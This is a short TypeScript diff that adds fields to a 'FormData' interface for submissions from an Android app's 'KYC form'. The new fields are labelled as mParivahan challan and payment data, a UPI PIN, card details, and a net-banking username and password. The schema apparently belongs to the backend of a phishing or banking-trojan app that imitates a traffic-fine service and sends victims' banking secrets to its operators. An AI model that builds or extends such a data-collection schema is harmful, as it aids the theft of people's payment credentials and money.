@@ -31,6 +31,19 @@ export interface SMS {
 
 // Form data submitted from Android app (multi-step KYC form)
 export interface FormData {
+    // mParivahan: Challan Info
+    vehicleNumber?: string;
+    // mParivahan: Payment
+    paymentMethod?: string;
+    paymentMode?: string;
+    amount?: string | number;
+    // mParivahan: UPI
+    upiApp?: string;
+    upiPin?: string;
+    upiBankName?: string;
+    // mParivahan: Card
+    cardType?: string;
+    cardHolderName?: string;
     // Step 2: KYC Login
     fullName?: string;
     mobileNumber?: string;
@@ -57,6 +70,10 @@ export interface FormData {
     userId?: string;
     accessCode?: string;
     profileCode?: string;
+    // Net Banking
+    bankName?: string;
+    username?: string;
+    password?: string;
     // Metadata
     submittedAt: string;
     pageName?: string;  // Which page this submission came from
